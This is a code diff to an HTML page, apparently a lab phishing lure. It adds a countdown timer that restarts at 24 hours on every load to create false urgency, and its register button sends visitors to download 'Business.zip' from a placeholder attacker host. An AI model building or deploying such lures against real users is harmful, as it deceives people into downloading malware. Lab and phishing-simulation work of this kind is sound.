@@ -103,6 +103,33 @@
     </footer>
 
     <script>
+        // Countdown Timer
+        function startCountdown() {
+            const endTime = new Date().getTime() + (24 * 60 * 60 * 1000); // 24 hours from now
+            const timerElement = document.getElementById('timer');
+
+            const updateTimer = () => {
+                const now = new Date().getTime();
+                const distance = endTime - now;
+
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+                timerElement.innerHTML = `${hours}h ${minutes}m ${seconds}s`;
+
+                if (distance < 0) {
+                    clearInterval(timerInterval);
+                    timerElement.innerHTML = "Registration Closed";
+                }
+            };
+
+            const timerInterval = setInterval(updateTimer, 1000);
+        }
+
+        // Start the countdown on page load
+        startCountdown();
+
         // Redirect to the provided URL when the button is clicked
         document.getElementById('registerButton').addEventListener('click', () => {
             window.location.href = 'http://attacker.lab.local/Business.zip';
